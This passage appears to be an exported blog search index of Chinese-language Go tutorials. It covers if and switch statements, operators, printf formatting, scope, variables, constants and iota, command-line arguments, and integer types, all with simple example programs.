1234567891011121314151617//第一种最基本num := 26 if(num %2==0)&#123; fmt.Printf(\"num是偶数\\n\") &#125; //第二种 初始化： if str:=\"jonson\"; num %2==0 &#123; fmt.Printf(str)&#125;//第三种 else语句：if(num %2==0)&#123; fmt.Printf(\"num是偶数\\n\") &#125;else&#123; fmt.Printf(\"num是奇数\\n\") &#125; if语句判断学生成绩1 12345678910111213141516171819202122232425//判断学生成绩func scoreTest()&#123; var score =80 if(score &gt;=90)&#123; fmt.Printf(\"优秀\") &#125; if(score &gt;=80 &amp;&amp; score &lt;90)&#123; fmt.Printf(\"良好\") &#125; if(score &gt;=70 &amp;&amp; score &lt;80)&#123; fmt.Printf(\"中等\") &#125; if(score &gt;=60 &amp;&amp; score &lt;70)&#123; fmt.Printf(\"及格\") &#125; if(score &lt;60)&#123; fmt.Printf(\"不及格\") &#125;&#125; if语句判断学生成绩改进2 12345678910111213//判断学生成绩func scoreTest3(score int)&#123; if(score &gt;=90)&#123; fmt.Printf(&quot;优秀&quot;) &#125;else if(score &gt;=80)&#123; fmt.Printf(&quot;良好&quot;) &#125;else if(score &gt;=70)&#123; fmt.Printf(&quot;中等&quot;) &#125;else if(score &gt;=60)&#123; fmt.Printf(&quot;及格&quot;) &#125;else&#123; fmt.Printf(&quot;不及格&quot;) &#125; 注意顺序，下面的代码是错误的： 1234567891011121314if(score &gt;=80 &amp;&amp; score &lt;90)&#123; fmt.Printf(\"良好\")&#125;if(score &gt;=70 &amp;&amp; score &lt;80)&#123; fmt.Printf(\"中等\")&#125;if(score &gt;=60 &amp;&amp; score &lt;70)&#123; fmt.Printf(\"及格\")&#125;if(score &lt;60)&#123; fmt.Printf(\"不及格\")&#125; switch switch形式一 使用switch语句判断成绩： 123456789101112131415161718192021222324package mainimport \"fmt\"func main()&#123; score :=56 switch&#123; case score &gt;=90: fmt.Printf(\"优秀\") case score &gt;=80: fmt.Printf(\"良好\") case score &gt;=70: fmt.Printf(\"中等\") case score &gt;=60: fmt.Printf(\"及格\") default: fmt.Printf(\"不及格\") &#125; operate()&#125; switch形式二 12345678910111213141516171819202122func operate()&#123; a,b,c := 4,2,0 operate :=\"*\" switch operate&#123; case \"+\": c=a+b case \"-\": c=a-b case \"*\": c=a*b case \"/\": c=a/b default: c = -1 &#125; fmt.Println(c)&#125; switch形式三 判断月份 12345678910111213141516171819202122232425262728293031package mainimport \"fmt\"func main() &#123; getDaysByMonth()&#125;func getDaysByMonth() &#123; // 定义局部变量：年、月、日 year := 2008 month := 12 days := 0 switch month &#123; case 1, 3, 5, 7, 8, 10, 12: days = 31 case 4, 6, 9, 11: days = 30 case 2: //判断闰年 if (year%4 == 0 &amp;&amp; year%100 != 0) || year%400 == 0 &#123; days = 29 &#125; else &#123; days = 28 &#125; default: days = -1 &#125; fmt.Printf(\"%d年%d月的天数为：%d\", year , month , days)&#125; switch形式四 1234567891011121314151617181920212223242526272829func main() &#123; eval()&#125;func eval() &#123; num1, num2, result := 12, 4, 0 operation := \"+\" switch operation &#123; case \"+\": result = num1 + num2 //fallthrough case \"-\": result = num1 - num2 //fallthrough case \"*\": result = num1 * num2 //fallthrough case \"/\": result = num1 / num2 //fallthrough case \"%\": result = num1 % num2 default: result = -1 &#125; fmt.Println(result)&#125; 总结 12345671、switch 语句执行的过程自上而下，直到找到case匹配项，匹配项中无需使用break，因为Go语言中的switch默认给每个case自带break，因此匹配成功后不会向下执行其他的case分支，而是跳出整个switch。2、变量 var1 可以是任何类型，而 val1 和 val2 则可以是同类型的任意值。类型不被局限于常量或整数，但必须是相同类型或最终结果为相同类型的表达式。3、case后的值不能重复。4、可以同时测试多个符合条件的值，也就是说case后可以有多个值，这些值之间使用逗号分割，例如：case val1, val2, val3。5、Go语言中switch后的表达式可以省略，那么默认是switch true。6、Go语言中的switch case因为自带break，所以匹配某个case后不会自动向下执行其他case，如需贯通后续的case，可以添加fallthrough（中文含义是：贯穿）， 强制执行后面的case分支7、fallthrough必须放在case分支的最后一行。如果它出现在中间的某个地方，编译器就会抛出错误（fallthrough statement out of place，含义是fallthrough不在合适的位置）。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[6]-operator运算符","slug":"golang-6-operator","date":"2018-11-17T09:55:45.000Z","updated":"2018-11-20T02:17:01.109Z","comments":true,"path":"2018/11/17/golang-6-operator/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-6-operator/","excerpt":"","text":"运算符 和其他语言一样，Go语言支持多种运算符，用于对变量进行运算。 12345678910111213package mainimport \"fmt\"func main()&#123; //math() //relation() //logic() //wei() Assign()&#125; 算术运算符 123456789101112func math()&#123; a := 4 b:=2 fmt.Printf(\"a+b的结果为：%d\\n\", a+b) fmt.Printf(\"a-b的结果为：%d\\n\", a-b) fmt.Printf(\"a*b的结果为：%d\\n\", a*b) fmt.Printf(\"a/b的结果为：%d\\n\", a/b)&#125; 关系运算符 123456789101112131415161718192021222324252627282930313233343536func relation()&#123; a := 4 b := 2 if(a==b)&#123; fmt.Printf(\"a与b相同\\n\") &#125;else&#123; fmt.Printf(\"a与b不同\\n\") &#125; if(a&lt;b)&#123; fmt.Printf(\"a小于b\\n\") &#125;else&#123; fmt.Printf(\"a大于b\\n\") &#125; if(a&gt;b)&#123; fmt.Printf(\"a大于b\\n\") &#125;else&#123; fmt.Printf(\"a小于b\\n\") &#125; if(a&lt;=b)&#123; fmt.Printf(\"a小于等于b\\n\") &#125;else&#123; fmt.Printf(\"a大于等于b\\n\") &#125; if(a&gt;=b)&#123; fmt.Printf(\"a大于等于b\\n\") &#125;else&#123; fmt.Printf(\"a小于等于b\\n\") &#125;&#125; 逻辑运算符 1234567891011121314151617181920212223func logic()&#123; a:=true b:=false if(a &amp;&amp; b)&#123; fmt.Printf(\"a与b 同时为true\\n\") &#125;else&#123; fmt.Printf(\"a与b 不同时为true\\n\") &#125; if(a || b)&#123; fmt.Printf(\"a与b 至少一个为true\\n\") &#125;else&#123; fmt.Printf(\"a与b 全部为false\\n\") &#125; if(!b)&#123; fmt.Printf(\"取反成功\\n\") &#125;else&#123; fmt.Printf(\"取反失败\\n\") &#125;&#125; 位运算 12345678910111213func wei()&#123; a := 3 b:= 4 fmt.Println(\"a &amp; b :\",a &amp; b) fmt.Println(\"a | b :\",a | b) fmt.Println(\"a ^ b :\",a ^ b) fmt.Println(\"^ b :\",^b) fmt.Println(\"a左移1位 :\",a &lt;&lt;1) fmt.Println(\"a右移一位:\",a &gt;&gt;1)&#125; 赋值运算符 12345678910111213141516func Assign()&#123; a := 3 var c int= 2 c += a // c = c+a fmt.Println(\"c+=a的结果为:\",c) c -= a //c = c -a fmt.Println(\"c-=a的结果为:\",c) c *= a // c = a *c fmt.Println(\"c*=a的结果为:\",c) c /= a // c = c /a fmt.Println(\"c/=a的结果为:\",c)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[5]-printf格式化打印","slug":"golang-5-printf","date":"2018-11-17T08:12:19.000Z","updated":"2019-01-20T05:20:32.049Z","comments":true,"path":"2018/11/17/golang-5-printf/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-5-printf/","excerpt":"","text":"输入： 下面的功能为获取键盘输入存储到map表中，打印数量超过1的字符串与个数 123456789101112131415161718192021222324package mainimport ( &quot;bufio&quot; &quot;fmt&quot; &quot;os&quot;)func main() &#123; counts := make(map[string]int) input := bufio.NewScanner(os.Stdin) for i:=0;input.Scan();i++&#123; counts[input.Text()]++ if i&gt;5&#123; break; &#125; &#125; // NOTE: ignoring potential errors from input.Err() for line, n := range counts &#123; if n &gt; 1 &#123; fmt.Printf(&quot;%d\\t%s\\n&quot;, n, line) &#125; &#125;&#125; 输入改进2： 即可获取键盘输入，又可获取文件的输入 1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( \"bufio\" \"fmt\" \"os\")func main() &#123; counts := make(map[string]int) files := os.Args[1:] if len(files) == 0 &#123; countLines(os.Stdin, counts) &#125; else &#123; for _, arg := range files &#123; f, err := os.Open(arg) if err != nil &#123; fmt.Fprintf(os.Stderr, \"dup2: %v\\n\", err) continue &#125; countLines(f, counts) f.Close() &#125; &#125; for line, n := range counts &#123; if n &gt; 1 &#123; fmt.Printf(\"%d\\t%s\\n\", n, line) &#125; &#125;&#125;func countLines(f *os.File, counts map[string]int) &#123; input := bufio.NewScanner(f) for input.Scan() &#123; counts[input.Text()]++ &#125; // NOTE: ignoring potential errors from input.Err()&#125; 输入改进3： 123456789101112131415161718192021222324252627package mainimport ( \"fmt\" \"io/ioutil\" \"os\" \"strings\")func main() &#123; counts := make(map[string]int) for _, filename := range os.Args[1:] &#123; data, err := ioutil.ReadFile(filename) if err != nil &#123; fmt.Fprintf(os.Stderr, \"dup3: %v\\n\", err) continue &#125; for _, line := range strings.Split(string(data), \"\\n\") &#123; counts[line]++ &#125; &#125; for line, n := range counts &#123; if n &gt; 1 &#123; fmt.Printf(\"%d\\t%s\\n\", n, line) &#125; &#125;&#125; golang输出的格式化打印 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport \"fmt\"func main()&#123; //通用的格式 str:=\"jonson\" fmt.Printf(\"%T,%v\\n\",str,str) //布尔 var booeanl = true fmt.Printf(\"%T,%t\\n\",booeanl,booeanl) //特殊字符 fmt.Printf(\"%%\\n\") fmt.Printf(\"\\\"\\n\") fmt.Printf(\"\\\\\\n\") //整数 fmt.Printf(\"%T,%d\\n\",123,123) fmt.Printf(\"%T,%6d\\n\",123,123) //6代表长度 fmt.Printf(\"%T,%06d\\n\",123,123)//0代表填充0 fmt.Printf(\"%T,%b\\n\",123,123) //二进制 fmt.Printf(\"%T,%o\\n\",123,123) //8进制 fmt.Printf(\"%T,%x\\n\",123,123) //16进制 fmt.Printf(\"%T,%#x\\n\",123,123) //前面加上0x fmt.Printf(\"%T,%#o\\n\",123,123)//前面加上0 fmt.Printf(\"%T,%#X\\n\",123,123) //大写的X代表字母会大写 fmt.Printf(\"% d,% d\\n\",123,-123) //空格代表正数前方会预留一个空格 // 浮点数 fmt.Printf(\"%T,%f\\n\",123.456,123.456) fmt.Printf(\"%T,%10f\\n\",123.456,123.456)//长度 fmt.Printf(\"%T,%.1f\\n\",123.456,123.456) //保留的小数位数 fmt.Printf(\"%T,%10.2f\\n\",123.456,123.456) //字符串 fmt.Printf(\"%T,%s\\n\",\"jonson\",\"jonson\") //字符串 fmt.Printf(\"%T,%c\\n\",'c',97)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[4]-scope作用域","slug":"golang-4-scope","date":"2018-11-17T03:15:53.000Z","updated":"2018-11-20T02:17:13.182Z","comments":true,"path":"2018/11/17/golang-4-scope/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-4-scope/","excerpt":"","text":"作用域 universe block &gt; package block &gt; file block &gt; function block &gt; inner block universe block 预声明的标识符。Go文件全部使用 12345678Types:bool byte complex64 complex128 error float32 float64 int int8 int16 int32 int64 rune string uint uint8 uint16 uint32 uint64 uintptrConstants:true false iotaZero value:nilFunctions:append cap close complex copy delete imag len make new panic print println real recover package block 例子 fmt下面的函数println 就是package scope 12345678910package mainimport \"fmt\"var x int=5func main()&#123; fmt.Println(\"mainx:\",x)&#125; 外部变量是package block： 下面的代码有效： 12345678910// f1.gopackage mainvar x int// f2.gopackage mainfunc f() &#123; fmt.Println(x)&#125; 调用另一个包中的函数和属性： 12345678910111213141516171819202122//testdemo/destdemo.gopackage testdemoimport \"fmt\"var Birth uint = 23func Haha()&#123; fmt.Println(\"lalalal\")&#125;//-------------------------------------package main // main/scope.goimport ( \"testdemo\" \"fmt\")func main()&#123; testdemo.Haha() fmt.Println(testdemo.Birth)&#125; 权限 如果要让包中的属性和变量被外部包调用，必须要首字母大写。 file block 下面的代码无效，因为import 是file block 。不能跨文件 12345678910// f1.gopackage mainimport \"fmt\"// f2.go 无效package mainfunc f() &#123; fmt.Println(\"Hello World\")&#125; function block 函数体内部的变量是function block，注意前后顺序，同时不能跨函数使用。 1234567891011121314151617181920212223242526func main() &#123; fmt.Println(\"Hello World\") x := 5 fmt.Println(x)&#125;//下面的代码无效：func main() &#123; fmt.Println(\"Hello World\") fmt.Println(x) x := 5&#125;//下面的代码无效2：func main() &#123; fmt.Println(\"Hello World\") x := 5 fmt.Println(x)&#125;//func test()&#123; fmt.Println(x)&#125; 函数内部变量与外部变量重名 就近原则 1234567891011121314package mainimport \"fmt\"var x int=5func test()&#123; var x int = 99; x = 100; fmt.Println(\"testx\",x) //fmt.Println(\"testy\",y)&#125; inner block 在花括号中声明的变量只在花括号中有效。 12345678//内部变量func main() &#123; fmt.Println(&quot;Hello World&quot;) // x is out of scope &#123; // x is out of scope x := 5 // x is in scope fmt.Println(x) // x is in scope &#125; // x is out of scope again&#125; 下面代码无效： 123456func main() &#123; &#123; x := 5 &#125; fmt.Println(x)&#125; 参考资料： Variables","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[3]-变量声明与赋值","slug":"golang-3-variables","date":"2018-11-17T02:23:33.000Z","updated":"2019-03-19T00:25:15.142Z","comments":true,"path":"2018/11/17/golang-3-variables/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-3-variables/","excerpt":"","text":"变量 变量是内存当中一段空间的抽象描述。变量的类型明确了空间的大小以及空间如何解析。 Go中的变量类型 1bool byte complex64 complex128 error float32 float64 int int8 int16 int32 int64 rune string uint uint8 uint16 uint32 uint64 uintptr 变量的声明与赋值 方式1 123456789package mainimport \"fmt\"func main() &#123; var x string x = \"Hello World\" fmt.Println(x)&#125; 方式2 注意，x := “Hello World” 等价于 var x = “Hello World” 自动推断类型，并且必须在函数体内部 12345678package mainimport \"fmt\"func main() &#123; x := 1 fmt.Println(x)&#125; 多样的赋值 123456789101112var i intvar U, V, W float64var k = 0var x, y float32 = -1, -2var ( i int u, v, s = 2.0, 3.0, \"bar\")//一组变量也可以通过调用一个函数，由函数返回的多个返回值初始化：var f, err = os.Open(name) // os.Open returns a file and an error 例子： 123456789101112131415161718192021222324package mainimport \"fmt\"func main()&#123; var a,b string= \"jonson\",\"jackson\" c,d := true,false e,f,g := \"jonson\",true,123 fmt.Println(\"a:\",a) fmt.Println(\"b:\",b) fmt.Println(\"c:\",c) fmt.Println(\"d:\",d) fmt.Println(\"e:\",e) fmt.Println(\"f:\",f) fmt.Println(\"g:\",g) //和普通var形式的变量声明语句一样，简短变量声明语句也可以用函数的返回值来声明和初始化变量，像下面的os.Open函数调用将返回两个值：//f, err := os.Open(name)&#125; 元祖赋值 元组赋值是另一种形式的赋值语句，它允许同时更新多个变量的值。在赋值之前，赋值语句右边的所有表达式将会先进行求值，然后再统一更新左边对应变量的值。这对于处理有些同时出现在元组赋值语句左右两边的变量很有帮助，例如我们可以这样交换两个变量的值： x, y = y, x a[i], a[j] = a[j], a[i] 或者是计算两个整数值的的最大公约数（GCD）（译注：GCD不是那个敏感字，而是greatest common divisor的缩写，欧几里德的GCD是最早的非平凡算法）： 123456func gcd(x, y int) int &#123; for y != 0 &#123; x, y = y, x%y &#125; return x&#125; 或者是计算斐波纳契数列（Fibonacci）的第N个数： 1234567func fib(n int) int &#123; x, y := 0, 1 for i := 0; i &lt; n; i++ &#123; x, y = y, x+y &#125; return x&#125; 零值问题 变量初始化不赋值的情况，默认为空。 例子： 123456789101112131415package mainimport \"fmt\"func main() &#123; var a int var b string var c float64 var d bool fmt.Printf(\"%v \\n\", a) fmt.Printf(\"%v \\n\", b) fmt.Printf(\"%v \\n\", c) fmt.Printf(\"%v \\n\", d) fmt.Println()&#125; 常量 常量一旦声明不能改变，并且常量必须赋予初始值。此代码无效func main() {const x int} 有效： 1234567891011package mainconst ( m = 1 n = 2)func main()&#123; const k = 8&#125; 常量表达式的值在编译期计算，而不是在运行期。每种常量的潜在类型都是基础类型：boolean、string或数字。 一个常量的声明语句定义了常量的名字，和变量的声明语法类似，常量的值不可修改，这样可以防止在运行期被意外或恶意的修改。例如，常量比变量更适合用于表达像π之类的数学常数，因为它们的值不会发生变化： const pi = 3.14159 // approximately; math.Pi is a better approximation 和变量声明一样，可以批量声明多个常量；这比较适合声明一组相关的常量： const ( e = 2.71828182845904523536028747135266249775724709369995957496696763 pi = 3.14159265358979323846264338327950288419716939937510582097494459 ) 所有常量的运算都可以在编译期完成，这样可以减少运行时的工作，也方便其他编译优化。当操作数是常量时，一些运行时的错误也可以在编译时被发现，例如整数除零、字符串索引越界、任何导致无效浮点数的操作等。 常量间的所有算术运算、逻辑运算和比较运算的结果也是常量，对常量的类型转换操作或以下函数调用都是返回常量结果：len、cap、real、imag、complex和unsafe.Sizeof。 因为它们的值是在编译期就确定的，因此常量可以是构成类型的一部分，例如用于指定数组类型的长度： const IPv4Len = 4 // parseIPv4 parses an IPv4 address (d.d.d.d). func parseIPv4(s string) IP { var p [IPv4Len]byte // … } 一个常量的声明也可以包含一个类型和一个值，但是如果没有显式指明类型，那么将从右边的表达式推断类型。在下面的代码中，time.Duration是一个命名类型，底层类型是int64，time.Minute是对应类型的常量。下面声明的两个常量都是time.Duration类型，可以通过%T参数打印类型信息： const noDelay time.Duration = 0 const timeout = 5 * time.Minute fmt.Printf(&quot;%T %[1]v\\n&quot;, noDelay) // “time.Duration 0” fmt.Printf(&quot;%T %[1]v\\n&quot;, timeout) // “time.Duration 5m0s” fmt.Printf(&quot;%T %[1]v\\n&quot;, time.Minute) // “time.Duration 1m0s” 如果是批量声明的常量，除了第一个外其它的常量右边的初始化表达式都可以省略，如果省略初始化表达式则表示使用前面常量的初始化表达式写法，对应的常量类型也一样的。例如： const ( a = 1 b c = 2 d ) fmt.Println(a, b, c, d) // “1 1 2 2” 如果只是简单地复制右边的常量表达式，其实并没有太实用的价值。但是它可以带来其它的特性，那就是iota常量生成器语法。 iota 使用 常量声明可以使用iota常量生成器初始化，它用于生成一组以相似规则初始化的常量，但是不用每行都写一遍初始化表达式。在一个const声明语句中，在第一个声明的常量所在的行，iota将会被置为0，然后在每一个有常量声明的行加一。 下面是来自time包的例子，它首先定义了一个Weekday命名类型，然后为一周的每天定义了一个常量，从周日0开始。在其它编程语言中，这种类型一般被称为枚举类型。 type Weekday int const ( Sunday Weekday = iota Monday Tuesday Wednesday Thursday Friday Saturday ) 周一将对应0，周一为1，如此等等。 我们也可以在复杂的常量表达式中使用iota，下面是来自net包的例子，用于给一个无符号整数的最低5bit的每个bit指定一个名字： type Flags uint const ( FlagUp Flags = 1 &lt;&lt; iota // is up FlagBroadcast // supports broadcast access capability FlagLoopback // is a loopback interface FlagPointToPoint // belongs to a point-to-point link FlagMulticast // supports multicast access capability ) 随着iota的递增，每个常量对应表达式1 &lt;&lt; iota，是连续的2的幂，分别对应一个bit位置。使用这些常量可以用于测试、设置或清除对应的bit位的值： 1234567891011121314func IsUp(v Flags) bool &#123; return v&amp;FlagUp == FlagUp &#125;func TurnDown(v *Flags) &#123; *v &amp;^= FlagUp &#125;func SetBroadcast(v *Flags) &#123; *v |= FlagBroadcast &#125;func IsCast(v Flags) bool &#123; return v&amp;(FlagBroadcast|FlagMulticast) != 0 &#125;func main() &#123; var v Flags = FlagMulticast | FlagUp fmt.Printf(&quot;%b %t\\n&quot;, v, IsUp(v)) // &quot;10001 true&quot; TurnDown(&amp;v) fmt.Printf(&quot;%b %t\\n&quot;, v, IsUp(v)) // &quot;10000 false&quot; SetBroadcast(&amp;v) fmt.Printf(&quot;%b %t\\n&quot;, v, IsUp(v)) // &quot;10010 false&quot; fmt.Printf(&quot;%b %t\\n&quot;, v, IsCast(v)) // &quot;10010 true&quot;&#125; 下面是一个更复杂的例子，每个常量都是1024的幂： const ( _ = 1 &lt;&lt; (10 * iota) KiB // 1024 MiB // 1048576 GiB // 1073741824 TiB // 1099511627776 (exceeds 1 &lt;&lt; 32) PiB // 1125899906842624 EiB // 1152921504606846976 ZiB // 1180591620717411303424 (exceeds 1 &lt;&lt; 64) YiB // 1208925819614629174706176 ) 不过iota常量生成规则也有其局限性。例如，它并不能用于产生1000的幂（KB、MB等），因为Go语言并没有计算幂的运算符。 iota从0开始循环 12345678910111213const ( a = iota b = iota c = iota d = iota)等价于：const ( a = iota b c d) 使用案例： 123456789101112131415161718package mainimport \"fmt\"func main() &#123; const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i)&#125; 变态iota 12345678910111213141516package mainimport \"fmt\"const ( i=1&lt;&lt;iota j=3&lt;&lt;iota k l)func main() &#123; fmt.Println(\"i=\",i) fmt.Println(\"j=\",j) fmt.Println(\"k=\",k) fmt.Println(\"l=\",l)&#125; 结果： 1234i= 1j= 6k= 12l= 24 iota表示从0开始自动加1，所以 i=1&lt;&lt;0, j=3&lt;&lt;1（&lt;&lt;表示左移的意思），即：i=1,j=6，这没问题，关键在k和l，从输出结果看 k=3&lt;&lt;2，l=3&lt;&lt;3。 简单表述: • i=1：左移 0 位,不变仍为 1; • j=3：左移 1 位,变为二进制 110, 即 6; • k=3：左移 2 位,变为二进制 1100, 即 12; • l=3：左移 3 位,变为二进制 11000,即 24。 Go语言中的byte和rune Go语言中byte和rune实质上就是uint8和int32类型。byte用来强调数据是raw data，而不是数字；而rune用来表示Unicode的code point。参考规范： uint8 the set of all unsigned 8-bit integers (0 to 255) int32 the set of all signed 32-bit integers (-2147483648 to 2147483647) byte alias for uint8 rune alias for int32 可以通过下面程序验证： 12345678910111213141516171819202122232425package mainimport \"fmt\"func byteSlice(b []byte) []byte &#123; return b&#125;func runeSlice(r []rune) []rune &#123; return r&#125;func main() &#123; b := []byte&#123;0, 1&#125; u8 := []uint8&#123;2, 3&#125; fmt.Printf(\"%T %T \\n\", b, u8) fmt.Println(byteSlice(b)) fmt.Println(byteSlice(u8)) r := []rune&#123;4, 5&#125; i32 := []int32&#123;6, 7&#125; fmt.Printf(\"%T %T \\n\", r, i32) fmt.Println(runeSlice(r)) fmt.Println(runeSlice(i32))&#125; 执行结果如下： 123456[]uint8 []uint8[0 1][2 3][]int32 []int32[4 5][6 7] 特殊 1234567891011package mainimport ( \"fmt\")func main() &#123; type newstring = string var a newstring = \"hello\" fmt.Println(a)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[2]-args","slug":"golang-2-args","date":"2018-11-17T01:23:33.000Z","updated":"2019-01-21T03:50:18.788Z","comments":true,"path":"2018/11/17/golang-2-args/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-2-args/","excerpt":"","text":"go打印命令行参数 123456789101112131415package mainimport ( \"fmt\" \"os\")func main() &#123; var s, sep string for i := 1; i &lt; len(os.Args); i++ &#123; s += sep + os.Args[i] sep = \" \" &#125; fmt.Println(s)&#125; 测试 123$ go build main.go$ ./main a b c d fa b c d f 更新2 123456789101112131415package mainimport ( &quot;fmt&quot; &quot;os&quot;)func main() &#123; s, sep := &quot;&quot;, &quot;&quot; for _, arg := range os.Args[1:] &#123; s += sep + arg sep = &quot; &quot; &#125; fmt.Println(s)&#125; 更新3 123456789101112package mainimport ( \"fmt\" \"os\" \"strings\")func main() &#123; fmt.Println(strings.Join(os.Args[1:], \" \"))&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[1]-basic","slug":"golang-1-basic","date":"2018-11-17T00:23:33.000Z","updated":"2019-01-21T08:40:18.931Z","comments":true,"path":"2018/11/17/golang-1-basic/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-1-basic/","excerpt":"","text":"Go语言中类似if和switch的关键字有25个；关键字不能用于自定义名字，只能在特定语法结构中使用。 12345break default func interface selectcase defer go map structchan else goto package switchconst fallthrough if range typecontinue for import return var 此外，还有大约30多个预定义的名字，比如int和true等，主要对应内建的常量、类型和函数。 12345678910內建常量: true false iota nil內建類型: int int8 int16 int32 int64 uint uint8 uint16 uint32 uint64 uintptr float32 float64 complex128 complex64 bool byte rune string error內建函數: make len cap new append copy close delete complex real imag panic recover 如果一个名字是在函数内部定义，那么它的就只在函数内部有效。如果是在函数外部定义，那么将在当前包的所有文件中都可以访问。名字的开头字母的大小写决定了名字在包外的可见性。如果一个名字是大写字母开头的（译注：必须是在函数外部定义的包级名字；包级函数名本身也是包级名字），那么它将是导出的，也就是说可以被外部的包访问，例如fmt包的Printf函数就是导出的，可以在fmt包外部访问。包本身的名字一般总是用小写字母。 名字的长度没有逻辑限制，但是Go语言的风格是尽量使用短小的名字，对于局部变量尤其是这样；你会经常看到i之类的短名字，而不是冗长的theLoopIndex命名。通常来说，如果一个名字的作用域比较大，生命周期也比较长，那么用长的名字将会更有意义。 在习惯上，Go语言程序员推荐使用驼峰式命名，当名字有几个单词组成的时优先使用大小写分隔，而不是优先用下划线分隔。因此，在标准库有QuoteRuneToASCII和parseRequestLine这样的函数命名，但是一般不会用quote_rune_to_ASCII和parse_request_line这样的命名。而像ASCII和HTML这样的缩略词则避免使用大小写混合的写法，它们可能被称为htmlEscape、HTMLEscape或escapeHTML，但不会是escapeHtml。 整型与运算 Go语言的数值类型包括几种不同大小的整形数、浮点数和复数。每种数值类型都决定了对应的大小范围和是否支持正负符号。让我们先从整形数类型开始介绍。 Go语言同时提供了有符号和无符号类型的整数运算。这里有int8、int16、int32和int64四种截然不同大小的有符号整形数类型，分别对应8、16、32、64bit大小的有符号整形数，与此对应的是uint8、uint16、uint32和uint64四种无符号整形数类型。 这里还有两种一般对应特定CPU平台机器字大小的有符号和无符号整数int和uint；其中int是应用最广泛的数值类型。这两种类型都有同样的大小，32或64bit，但是我们不能对此做任何的假设；因为不同的编译器卽使在相同的硬件平台上可能产生不同的大小。 Unicode字符rune类型是和int32等价的类型，通常用于表示一个Unicode码点。这两个名称可以互换使用。同样byte也是uint8类型的等价类型，byte类型一般用于强调数值是一个原始的数据而不是一个小的整数。 最后，还有一种无符号的整数类型uintptr，没有指定具体的bit大小但是足以容纳指针。uintptr类型只有在底层编程是才需要，特别是Go语言和C语言函数库或操作系统接口相交互的地方。我们将在第十三章的unsafe包相关部分看到类似的例子。 不管它们的具体大小，int、uint和uintptr是不同类型的兄弟类型。其中int和int32也是不同的类型，卽使int的大小也是32bit，在需要将int当作int32类型的地方需要一个显式的类型转换操作，反之亦然。 下面是Go语言中关于算术运算、逻辑运算和比较运算的二元运算符，它们按照先级递减的顺序的排列： / % &lt;&lt; &gt;&gt; &amp; &amp;^ - | ^ == != &lt; &lt;= &gt; &gt;= &amp;&amp; || 二元运算符有五种优先级。在同一个优先级，使用左优先结合规则，但是使用括号可以明确优先顺序，使用括号也可以用于提升优先级 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647算术运算符+、-、*和/可以适用与于整数、浮点数和复数，但是取模运算符%仅用于整数间的运算。对于不同编程语言，%取模运算的行为可能并不相同。在Go语言中，%取模运算符的符号和被取模数的符号总是一致的，因此-5%3和-5%-3结果都是-2。除法运算符/的行为则依赖于操作数是否为全为整数，比如5.0/4.0的结果是1.25，但是5/4的结果是1，因为整数除法会向着0方向截断余数。如果一个算术运算的结果，不管是有符号或者是无符号的，如果需要更多的bit位才能正确表示的话，就说明计算结果是溢出了。超出的高位的bit位部分将被丢弃。如果原始的数值是有符号类型，而且最左边的bit为是1的话，那么最终结果可能是负的，例如int8的例子：var u uint8 = 255fmt.Println(u, u+1, u*u) // &quot;255 0 1&quot;var i int8 = 127fmt.Println(i, i+1, i*i) // &quot;127 -128 1&quot;两个相同的整数类型可以使用下面的二元比较运算符进行比较；比较表达式的结果是布尔类型。== equal to!= not equal to&lt; less than&lt;= less than or equal to&gt; greater than&gt;= greater than or equal to事实上，布尔型、数字类型和字符串等基本类型都是可比较的，也就是说两个相同类型的值可以用==和!=进行比较。此外，整数、浮点数和字符串可以根据比较结果排序。许多其它类型的值可能是不可比较的，因此也就可能是不可排序的。对于我们遇到的每种类型，我们需要保证规则的一致性。这里是一元的加法和减法运算符：+ 一元加法 (無效果)- 負數对于整数，+x是0+x的简写，-x则是0-x的简写；对于浮点数和复数，+x就是x，-x则是x 的负数。Go语言还提供了以下的bit位操作运算符，前面4个操作运算符并不区分是有符号还是无符号数：&amp; 位運算 AND| 位運算 OR^ 位運算 XOR&amp;^ 位清空 (AND NOT)&lt;&lt; 左移&gt;&gt; 右移位操作运算符^作为二元运算符时是按位异或（XOR），当用作一元运算符时表示按位取反；也就是说，它返回一个每个bit位都取反的数。位操作运算符&amp;^用于按位置零（AND NOT）：表达式z = x &amp;^ y结果z的bit位为0，如果对应y中bit位为1的话，否则对应的bit位等于x相应的bit位的值。下面的代码演示了如何使用位操作解释uint8类型值的8个独立的bit位。它使用了Printf函数的%b参数打印二进制格式的数字；其中%08b中08表示打印至少8个字符宽度，不足的前缀部分用0填充。var x uint8 = 1&lt;&lt;1 | 1&lt;&lt;5var y uint8 = 1&lt;&lt;1 | 1&lt;&lt;2fmt.Printf(&quot;%08b\\n&quot;, x) // 